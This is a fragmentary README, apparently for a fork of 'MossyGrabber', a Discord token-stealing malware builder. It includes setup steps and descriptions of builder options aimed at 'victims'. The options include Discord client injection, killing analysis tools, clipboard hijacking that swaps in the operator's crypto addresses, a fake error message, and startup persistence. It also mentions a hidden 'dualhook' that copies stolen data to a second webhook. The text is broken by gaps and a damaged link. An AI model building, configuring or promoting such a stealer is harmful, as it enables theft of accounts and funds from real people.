...
A review of the code [link](https://github.com/KSCHdsc/MossyGrabber

-Inject/blob/main/index.js#L186) reveals that we send the same HTTP request 2 times,
one time for `config.webhook` and one time for `config.uwu` who is the dualhook url.

![](https://raw.githubusercontent.com/KSCHdsc/MossyGrabber-Assets/main/Banner.png)

**NOTE:** 
- MossyGrabber was made for educational purposes, there for all consequences caused by your actions are **your** responsibility and accountability.
...
3. Install all requirements [install.bat](https://github.com/Inplex-sys/MossyGrabber-NoDualHook/blob/main/install.bat)
4. Click on start.bat [start.bat](https://github.com/Inplex-sys/MossyGrabber-NoDualHook/blob/main/start.bat)
...
```d
@MossyGrabber: This is a option to "KILL" all discord clients opened 
and to restart them with the MossyGrabber injection 
(so i recommand "yes")
```
![](https://media.discordapp.net/attachments/912038729626058853/1062469117954768998/image.png)
```d
@MossyGrabber: This is a option to "KILL" all process which could analyze the properties of MossyGrabber, 
...
```d
@MossyGrabber: This is a option to ping when someone run BlackCap you can specify "everyone" or "here"
```
![](https://media.discordapp.net/attachments/912038729626058853/1062470764609151016/image.png)
```d
@MossyGrabber: This option replaces each of the crypto addresses copied by the victim with yours, 
...
```d
@MossyGrabber: If you chose 'yes' to the previous option you will have to fill in this with 
...
```d
@MossyGrabber: This option allows you to display an error message when someone launches your blackcap 
for the moment it is a predefined message but later it will be customizable
```
![]FILE DELETED)
```d
@MossyGrabber: This option will make a copy of the .exe in the windows startup of your victims and 
MossyGrabber will therefore launch at each start
...
```d
@MossyGrabber: This option will create an .exe if you put 'no' the final file will be an .py
```
![](https://media.discordapp.net/attachments/912038729626058853/1062474813135925288/image.png)
```d
@MossyGrabber: If you chose 'yes' in the previous option this option will add an icon to your .exe
```
